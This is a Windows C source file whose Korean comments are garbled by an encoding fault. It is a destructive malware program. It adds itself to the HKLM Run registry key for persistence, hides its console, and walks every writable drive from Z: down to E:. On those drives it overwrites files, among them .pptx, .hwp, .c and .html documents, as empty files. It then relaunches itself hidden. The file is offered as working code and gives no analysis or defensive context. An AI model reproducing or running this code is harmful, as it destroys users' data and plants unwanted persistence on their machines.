#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <io.h>// ����ã��
#define PATH_SIZE 1000

BOOL SetStartProgram(LPCSTR lpPosition); // ���� ���α׷����� ���

void FileList(char *path, char* ext, int search);

void CheckDevice(void);

int main(int argc, char** argv) {
	SetStartProgram(argv[0]);

	//�ܼ�â �Ⱥ��̰�
	HWND hWndConsole = GetConsoleWindow();
	ShowWindow(hWndConsole, SW_HIDE);

	CheckDevice();

	//â�� �Ⱥ��̰� ������ ����
	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);

}


void CheckDevice(void) {
	int i;
	char ch = 'Z', pos[50];
	FILE* fp = NULL;

	while (ch != 'D') {
		sprintf(pos, "%c:\\AutoRun.txt", ch);

		if ((fp = fopen(pos, "w")) != NULL) {
			sprintf(pos, "%c:", ch);
			//printf("%c ��ũ Ž�� ����\n", ch);
			for (i = 0; i<2; i++) {
				FileList(pos, "pptx", i);
				FileList(pos, "hwp", i);
				FileList(pos, "c", i);
				FileList(pos, "html", i);
			}

		}
		ch--;
	}

}


//����Լ� ���·� path �ȿ� �ִ� ��� ���� ��� Ž��
void FileList(char *path, char* ext, int search)
{
	char newPath[PATH_SIZE];
	_finddata_t fd;
	long handle;
	int result = 1;
	FILE* fp = NULL;

	//search 0 - ���� Ž��, search 1 - ext ���� Ž��
	if (search == 0) {
		sprintf(newPath, "%s\\*.", path);
	}
	else {
		sprintf(newPath, "%s\\*.%s", path, ext);
	}

	//Path ������ ���� ���������� �ִ��� üũ
	if ((handle = _findfirst(newPath, &fd)) == -1L) { return; }

	//���� ��θ� ��� Ž��
	while (result != -1)
	{
		//���� ���� Ž��
		if ((search == 0) && strcmp(fd.name, ".") && strcmp(fd.name, "..")) {
			sprintf(newPath, "%s\\%s", path, fd.name);
			FileList(newPath, ext, 0);//���� ������ �ִ� ���� Ž��
			FileList(newPath, ext, 1);//���� ������ �ִ� ext���� Ž��
		}
		else {
			//�� ���Ϸ� ä���
			sprintf(newPath, "%s\\%s", path, fd.name);
			CreateFile(newPath, GENERIC_READ | GENERIC_WRITE, 0, 0,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		}

		//���� ��η� �̵�
		result = _findnext(handle, &fd);
	}

	_findclose(handle);
	return;
}



BOOL SetStartProgram(LPCSTR lpPosition) {
	HKEY hKey; // �ڵ� Ű
	long error; // ���� Ȯ��

	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L,
		KEY_WRITE, &hKey); // �������Ϳ� �ִ� Ű ����

	if (error == ERROR_SUCCESS) { // ���� �ߴ��� Ȯ��
		error = RegSetValueEx(hKey, TEXT("HELLO"), 0, REG_SZ, (BYTE*)lpPosition, lstrlen(lpPosition));
		RegCloseKey(hKey); // ���Ϲ��� �ڵ�Ű�� Hello��� ������Ʈ���� REG_SZ�������� ����� lpPosition ���α׷����� ���� ����Ѵ�.

		return true;
	}
	else if (error == ERROR_ACCESS_DENIED) { // ���� �� ���(������ ���� ���)
		printf("ERROR_ACCESS_DENIED\n");
	}
	else {
		printf("ERRORCODE : %ld\n", error); // �ٸ� ����
	}

	return false;
}